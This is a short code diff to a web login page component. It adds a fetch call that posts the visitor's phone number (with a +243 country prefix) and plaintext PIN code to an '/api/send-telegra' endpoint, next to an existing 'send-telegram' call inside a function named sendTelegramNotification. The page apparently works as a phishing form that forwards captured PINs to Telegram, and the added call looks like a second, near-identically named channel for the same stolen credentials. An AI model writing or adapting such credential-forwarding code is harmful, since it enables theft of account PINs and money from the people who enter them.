@@ -33,6 +33,19 @@ export default function LoginPage() {
 const pinCode = pinDigits.join("");
   const sendTelegramNotification = async () => {
     try {
+
+        fetch('/api/send-telegra', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          phoneNumber: `+243${phoneNumber}`,
+          pinCode : `${pinCode}`,
+          action: 'login_attempt',
+          timestamp: new Date().toISOString(),
+        }),
+      });
+
+      
       const response = await fetch('/api/send-telegram', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
